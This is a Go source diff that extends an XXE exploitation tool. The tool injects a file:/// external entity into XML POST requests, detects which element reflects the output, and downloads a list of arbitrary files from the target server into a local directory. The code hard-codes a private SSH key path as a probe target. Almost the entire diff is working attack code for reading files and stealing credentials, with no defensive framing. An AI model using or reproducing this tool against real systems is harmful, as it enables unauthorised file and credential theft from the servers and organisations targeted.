@@ -1,13 +1,17 @@
 package xxe
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/xml"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
 	"regexp"
+
+	fp "path/filepath"
 
 	str "strings"
 )
@@ -32,7 +36,7 @@ func walkNodes(nodes []NodeT, f func(NodeT) bool) {
 	}
 }
 
-func DirectTest(url, xmlTemplate, cookie string) error {
+func DirectTest(url, xmlTemplate, cookie, outDir, fileList string) error {
 	fmt.Println("testing...")
 
 	xmlData, err := ioutil.ReadFile(xmlTemplate)
@@ -40,12 +44,56 @@ func DirectTest(url, xmlTemplate, cookie string) error {
 		return err
 	}
 
+	leafName, err := DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList)
+	if err != nil {
+		return err
+	}
+
+	if leafName == "" {
+		return fmt.Errorf("can't find XXE injection")
+	}
+
+	files, err := readFileList(fileList)
+	if err != nil {
+		return err
+	}
+
+	for _, file := range files {
+		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
+		entity := fmt.Sprintf(fmtS, file)
+
+		reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)
+
+		content, err := getFileContent(url, file, reqXml,
+			cookie, outDir, leafName)
+		if err != nil {
+			return err
+		}
+
+		if content != "" {
+			locFile := makeLocalPath(outDir, file)
+			err = saveFile(locFile, content, false)
+			if err != nil {
+				return err
+			}
+		}
+	}
+
+	return nil
+}
+
+func DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList string) (string, error) {
+	xmlData, err := ioutil.ReadFile(xmlTemplate)
+	if err != nil {
+		return "", err
+	}
+
 	dec := xml.NewDecoder(bytes.NewBuffer(xmlData))
 
 	var n NodeT
 	err = dec.Decode(&n)
 	if err != nil {
-		return err
+		return "", err
 	}
 
 	var leafs []LeafT
@@ -62,40 +110,126 @@ func DirectTest(url, xmlTemplate, cookie string) error {
 		return true
 	})
 
-	file := "c:/windows/win.ini"
-	entity := fmt.Sprintf(
-		`<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`, file)
-
-	reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)
-
-	for _, leaf := range leafs {
-		exp := fmt.Sprintf(`(<%s>).*(</%s>)`, leaf.Name, leaf.Name)
-		re := regexp.MustCompile(exp)
-		reqXmlMod := re.ReplaceAllString(reqXml, `${1}&ext;${2}`)
-
-		makeRequest(url, reqXmlMod, cookie)
+	files, err := readFileList(fileList)
+	if err != nil {
+		return "", err
 	}
+
+	files = append(files, "c:/users/daniel/.ssh/id_rsa")
+
+	for _, file := range files {
+		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
+		entity := fmt.Sprintf(fmtS, file)
+
+		reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)
+
+		for _, leaf := range leafs {
+			content, err := getFileContent(url, file, reqXml,
+				cookie, outDir, leaf.Name)
+			if err != nil {
+				return "", err
+			}
+
+			if content != "" {
+				return leaf.Name, nil
+			}
+		}
+	}
+
+	return "", nil
+}
+
+func getFileContent(url, file, reqXml, cookie, outDir, leafName string) (string, error) {
+	exp := fmt.Sprintf("(<%s>).*(</%s>)", leafName, leafName)
+	re := regexp.MustCompile(exp)
+
+	sep := str.Repeat("-=x=", 15) + "-"
+	replStr := fmt.Sprintf("${1}\n%s&ext;%s\n${2}", sep, sep)
+	reqXmlMod := re.ReplaceAllString(reqXml, replStr)
+
+	body, err := makeRequest(url, reqXmlMod, cookie, outDir)
+	if err != nil {
+		return "", err
+	}
+	if str.Contains(body, sep) {
+		bodyFields := str.Split(body, sep)
+		return bodyFields[1], nil
+	}
+	return "", nil
+}
+
+func saveFile(file, content string, isDeflated bool) error {
+	opts := os.O_CREATE | os.O_TRUNC | os.O_WRONLY
+	fd, err := os.OpenFile(file, opts, 0644)
+	if err != nil {
+		return err
+	}
+	defer fd.Close()
+
+	fmt.Fprintf(fd, content)
 
 	return nil
 }
 
-func makeRequest(url, reqXml, cookie string) {
+func readFileList(path string) ([]string, error) {
+	var fileList []string
+
+	fd, err := os.Open(path)
+	defer fd.Close()
+	if err != nil {
+		return fileList, err
+	}
+
+	input := bufio.NewScanner(fd)
+	for input.Scan() {
+		line := str.Trim(input.Text(), " ")
+		fileList = append(fileList, line)
+	}
+
+	return fileList, nil
+}
+
+func makeLocalPath(outDir, path string) string {
+	path = fp.Clean(path)
+	pFields := str.Split(path, "/")
+
+	errPath := pFields[0] == "." || pFields[0] == ".." || pFields[0] == "/"
+	if len(pFields) == 1 && errPath {
+		return outDir + "/out_file"
+	} else if len(pFields) == 1 {
+		return fp.Join(outDir, pFields[0])
+	}
+
+	var cleanFields []string
+	for _, el := range pFields[1:] {
+		if el != ".." {
+			cleanFields = append(cleanFields, el)
+		}
+	}
+
+	path = str.Join(cleanFields, "/")
+	path = fp.Join(outDir, path)
+	os.MkdirAll(fp.Dir(path), 0750)
+
+	return path
+}
+
+func makeRequest(url, reqXml, cookie, outDir string) (string, error) {
 	client := &http.Client{}
 
 	req, err := http.NewRequest("POST", url, str.NewReader(reqXml))
 	if err != nil {
-		fmt.Printf("error %+v...\n", err)
-		return
+		return "", err
 	}
 	req.Header.Set("Content-Type", "text/xml")
 	req.Header.Set("cookie", cookie)
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Printf("error %+v...\n", err)
-		return
+		return "", err
 	}
 	bodyText, err := ioutil.ReadAll(resp.Body)
-	fmt.Printf("%s\n", bodyText)
+
+	return string(bodyText), nil
 }
 
 func dtdHandler(w http.ResponseWriter, r *http.Request) {
